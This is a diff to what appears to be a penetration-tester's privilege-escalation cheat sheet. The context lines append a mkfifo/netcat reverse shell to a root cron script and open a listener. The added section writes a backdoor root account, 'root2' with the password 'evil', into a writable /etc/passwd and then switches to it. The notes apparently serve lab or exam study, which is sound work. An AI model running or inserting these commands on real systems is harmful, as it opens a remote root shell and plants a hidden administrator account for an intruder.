@@ -79,3 +79,12 @@ Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.
 3. echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh
 4. nc -lnvp 1234
  ```
+ ##### Insecure file permission /etc/passwd
+ ```
+ 1. check if users have write permission
+ 2. openssl passwd evil:
+ $1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1
+ IozRIqhlxS7jo
+ 3. echo "root2:$1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1:0:0:root:/root:/bin/bash" >> /etc/passwd
+ 4. su root2, enter passwd as evil
+ ```
